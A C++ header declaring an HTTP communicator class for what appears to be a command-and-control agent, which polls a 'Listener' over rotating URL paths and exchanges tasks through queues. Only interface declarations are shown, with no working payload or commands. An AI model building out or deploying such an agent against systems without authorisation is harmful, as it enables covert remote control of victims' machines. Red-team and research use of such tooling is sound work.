#pragma once
#include <Windows.h>
#include "utils/winapi.h"
#include "communicators/base.h"

/* Struct that stores arguments to StartCommunicatorThread() function */
struct HttpCommunicatorThreadArgs : BaseCommunicatorThreadArgs
{
    PCHAR pUrlPathChoices;
};

/*
HTTP Communicator; connects to HTTP Listener
*/
class HttpCommunicator : public BaseCommunicator
{
private:
    PCHAR pUrlPathChoices;        // Array of URL paths to query
    DWORD urlPathChoicesNum;      // Num of URL paths to query
    DWORD lastUrlPathChoiceIndex; // Index of last URL path that was queried

protected:
    /* Starts and maintains communication with Listener; invoked internally by StartCommunicatorThread() */
    void StartCommunication() override;

public:
    /* Constructor; for initialisation */
    HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue);

    /* Destructor; for cleanup */
    ~HttpCommunicator();

    /* Send and receive data to/from Listener */
    void CommunicateOnceWithListener(BOOL forRegistration) override;

    /* Starts communicator thread */
    static void WINAPI StartCommunicatorThread(HttpCommunicatorThreadArgs *pHttpCommunicatorThreadArgs);
};